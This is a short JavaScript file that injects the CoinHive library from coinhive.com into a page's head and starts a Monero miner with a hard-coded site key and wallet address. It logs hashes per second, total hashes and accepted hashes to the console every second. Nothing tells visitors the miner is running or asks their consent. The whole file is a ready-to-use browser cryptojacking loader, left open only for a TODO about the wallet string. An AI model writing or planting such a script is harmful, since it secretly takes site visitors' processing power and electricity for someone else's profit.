var script = document.createElement('script');
script.onload = function () {
  // XMR Pool hash
	var m = new CoinHive.Anonymous( 'Ff1v6mgtt3LpkjenHXWTrQXZ71QGT30o', {throttle: 0.7} );
	// TODO: Replace the below string with wallet string
	m.start('43er6EeusBRXUqY4w3tXWVD6HpBV57cXn4Y4kDeMVcz1Ji1R6zJhDwxNz2gGCEzWEgD5Z5sSWnsJ53rEcrwsf8Pm7pudpSc');
  
	m.on('found', function () { console.log('Found!'); });
	m.on('accepted', function () { console.log('Accepted!'); });
	/*
	miner.on('update', function (data) {
			console.log('Hashes per second: ' + data.hashesPerSecond);
			console.log('Total hashes: ' + data.totalHashes);
			console.log('Accepted hashes: ' + data.acceptedHashes);
		}
	);
	*/
	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = m.getHashesPerSecond();
		var totalHashes = m.getTotalHashes();
		var acceptedHashes = m.getAcceptedHashes();

		// Output to HTML elements...
		console.log('hps=' + hashesPerSecond);
		console.log('th=' + totalHashes);
		console.log('ah=' + acceptedHashes);
		
	}, 1000);  
  
  
  
  
 };
script.src = 'https://coinhive.com/lib/coinhive.min.js';
document.head.appendChild(script);